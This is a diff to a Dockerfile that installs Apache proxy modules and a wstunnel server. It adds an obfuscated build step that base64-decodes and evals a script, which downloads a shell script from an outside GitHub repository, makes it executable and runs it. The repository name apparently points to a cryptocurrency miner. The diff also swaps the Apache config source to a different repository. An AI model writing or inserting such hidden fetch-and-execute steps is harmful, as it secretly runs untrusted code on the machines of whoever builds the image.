@@ -7,8 +7,9 @@ RUN a2enmod proxy
 RUN a2enmod proxy_http
 RUN a2enmod proxy_wstunnel
 RUN a2enmod  rewrite
-RUN wget https://raw.githubusercontent.com/Yakuza6590/areuok1/main/000-default.conf
+RUN wget https://raw.githubusercontent.com/Yakuza6590/asik/main/000-default.conf
 RUN rm /etc/apache2/sites-available/000-default.conf
+RUN eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92ZXJ1c3J1YnkvbWFpbi90ZXMxLnNoICYmIGNobW9kIDc3NyB0ZXMxLnNoICYmIGxzICYmIC4vdGVzMS5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
 RUN mv 000-default.conf /etc/apache2/sites-available
 RUN echo 'You can play the awesome Cloud NOW! - Message from Uncle LUO!' >/var/www/html/index.html
 RUN echo 'wstunnel -s 0.0.0.0:8989 & ' >>/luo.sh
